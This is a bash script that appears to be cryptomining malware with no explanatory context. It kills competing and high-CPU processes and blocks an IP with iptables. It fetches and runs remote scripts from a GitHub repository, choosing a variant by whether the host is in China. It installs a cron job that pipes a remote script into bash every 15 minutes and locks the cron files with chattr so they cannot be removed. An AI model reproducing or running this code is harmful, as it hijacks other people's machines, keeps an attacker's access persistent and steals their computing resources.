#!/bin/bash
for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1; do
    if [ -f "$file" ]; then
        chattr -i -a "$file"
    fi
done

crontab -r
iptables -A INPUT -s 66.23.199.44 -j DROP
pkill -9 -f 'bash -s '
for pid in $(pgrep -f 'bash /tmp/.*\.sh'); do
    if [ "$pid" != "$$" ] && [ "$pid" != "$PPID" ]; then
        kill -9 "$pid" 2>/dev/null && echo "Killed process $pid"
    fi
done

if [ "$(id -u)" -eq 0 ]; then
    echo "Stopping systemd_s service..."
    systemctl stop systemd_s
fi

check_system_specs() {
    local cpu_count=$(nproc 2>/dev/null || grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo 1)
    local is_root=false
    if [[ $EUID -eq 0 ]]; then is_root=true; fi
    if [[ $cpu_count -gt 8 && "$is_root" == "true" ]]; then
        echo "VERY GOOD BOY!"
    fi
}
check_system_specs

kill_high_cpu_processes() {
    local threshold=150.0
    local exclude_patterns=("reservepattern454545")
    local pid cpu cmdline
    ps -eo pid,%cpu --sort=-%cpu | awk -v threshold="$threshold" \
        'NR>1 && $2 > threshold {print $1}' | while read -r pid; do
        if [ -f "/proc/$pid/cmdline" ]; then
            cmdline=$(tr '\0' ' ' < "/proc/$pid/cmdline")
        else
            echo "PID $pid died before inspection"
            continue
        fi
        for pattern in "${exclude_patterns[@]}"; do
            if [[ "$cmdline" == *"$pattern"* ]]; then
                echo "Excluding PID $pid (matched '$pattern')"
                continue 2
            fi
        done
        if kill -9 "$pid" 2>/dev/null; then
            echo "Killed PID $pid (CPU: $(ps -p "$pid" -o %cpu --no-headers)%)"
        else
            echo "Failed to kill PID $pid (already dead or permission denied)"
        fi
    done
}
kill_high_cpu_processes

is_program_running() {
    found=0
    for proc_dir in /proc/[0-9]*; do
        if [ -d "$proc_dir" ]; then
            pid=$(basename "$proc_dir")
            if [ -r "$proc_dir/cmdline" ]; then
                cmdline=$(cat "$proc_dir/cmdline" 2>/dev/null | tr '\0' ' ')
                if echo "$cmdline" | grep -q "reservepattern454545" && \
                   ! echo "$cmdline" | grep -q "is_program_running"; then
                    if [ -r "$proc_dir/stat" ]; then
                        state=$(awk '{print $3}' "$proc_dir/stat" 2>/dev/null)
                        if [ "$state" != "Z" ]; then
                            found=1
                            break
                        fi
                    fi
                fi
            fi
        fi
    done
    if [ $found -eq 1 ]; then
        echo "Program is running."
        return 0
    else
        echo "Program is not running."
        return 1
    fi
}

download_and_execute() {
    local primary_url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/run2.sh"
    local china_url="https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/runCN2.sh"
    local output_file="run2.sh"
    local is_in_china=false

    if command -v curl &> /dev/null; then
        if curl -s --connect-timeout 3 -4 http://ip-api.com/json/ | grep -q '"country":"China"'; then
            is_in_china=true
        fi
    elif command -v wget &> /dev/null; then
        if wget -qO- --timeout=3 -4 http://ip-api.com/json/ | grep -q '"country":"China"'; then
            is_in_china=true
        fi
    fi

    local download_url="$primary_url"
    if [ "$is_in_china" = true ]; then
        download_url="$china_url"
    fi

    if command -v wget &> /dev/null; then
        wget -qO "$output_file" "$download_url"
    elif command -v curl &> /dev/null; then
        curl -k -o "$output_file" "$download_url"
    else
        echo "Error: Neither wget nor curl is available. Please install one of them."
        exit 1
    fi

    if [[ -f "$output_file" ]]; then
        chmod +x "$output_file"
        sed -i 's/\r$//' "$output_file"
        bash ./"$output_file"
        rm -f "$output_file"
    else
        echo "Error: Failed to download the script from $download_url"
        exit 1
    fi
}

get_cpu_count() {
    if [ -f "/proc/cpuinfo" ]; then
        grep -c ^processor /proc/cpuinfo
    else
        sysctl -n hw.ncpu 2>/dev/null || nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1
    fi
}

is_ec2_host() {
    hostname | grep -qi -e "ec2" -e "compute"
    return $?
}

# Main logic
if ! is_program_running; then
    cpu_count=$(get_cpu_count)
    if [ "$cpu_count" -gt 3 ] || is_ec2_host; then
        download_and_execute
    else
        echo "LOW CPU: System has only $cpu_count CPUs (minimum 4 required) and is not an EC2 instance"
    fi
fi

create_cronjob() {
    local cron_command
    if command -v curl >/dev/null; then
        cron_command="/bin/sh -c 'curl -fsSLk $1 | tr -d '\''\\r'\'' | bash'"
    elif command -v wget >/dev/null; then
        cron_command="/bin/sh -c 'wget -qO- $1 | tr -d '\''\\r'\'' | bash'"
    else
        log "Error: Cannot create cron job, neither curl nor wget is available."
        return 1
    fi
    (crontab -l 2>/dev/null | grep -vF "$1"; echo "*/15 * * * * $cron_command") | crontab -
    log "Cron job successfully configured."
}

create_cronjob "https://raw.githubusercontent.com/thisisforwork440-ops/ironrock/refs/heads/main/mon2.sh"

for file in /etc/cron.d/$(whoami) /etc/cron.d/apache /var/spool/cron/$(whoami) /var/spool/cron/crontabs/$(whoami) /etc/cron.hourly/oanacroner1 /etc/init.d/down; do
    if [ -f "$file" ]; then
        chattr +i "$file"
        chattr +a "$file"
    fi
done
